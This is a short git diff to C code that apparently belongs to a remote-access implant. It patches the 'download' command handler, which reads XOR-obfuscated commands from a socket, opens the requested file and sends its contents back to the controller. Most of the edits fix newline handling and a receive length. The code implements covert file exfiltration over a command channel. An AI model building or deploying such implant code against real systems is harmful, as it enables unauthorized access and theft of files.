@@ -137,9 +137,10 @@ int main(void) {
 		else if(str_starts_with(xorbuf, "download") == 0){
                         
                                 char* cmd = split(xorbuf, " ");
+				char* cmdtunc = newline_terminator(cmd);
                                 cmd[strlen(cmd)-1] = '\0'; // Remove newline
-                               
-                                FILE* fp = fopen(cmd, "r");
+				printf("Strlen is: %i\n", strlen(cmdtunc));
+                                FILE* fp = fopen(cmdtunc, "r");
                                 if(fp == NULL){
                                         
                                         char* openerr = "[-] Error opening file\n";
@@ -156,12 +157,12 @@ int main(void) {
                                         char confirm[5];
                                         send(sock, xordownload, strlen(download), 0);
                                         recv(sock, confirm, 5, 0);
-                                        char* xorconfirm = XOR(confirm, key, strlen(confirm), keylen);
+                                        char* xorconfirm = XOR(confirm, key, 5, keylen);
                                         if(strcmp(xorconfirm, "OK") == 0){
                                                 sendfile(fp, sock, key);
                                         }
                                         else{
-                                                continue;
+						continue;
                                         }
 				}
                         
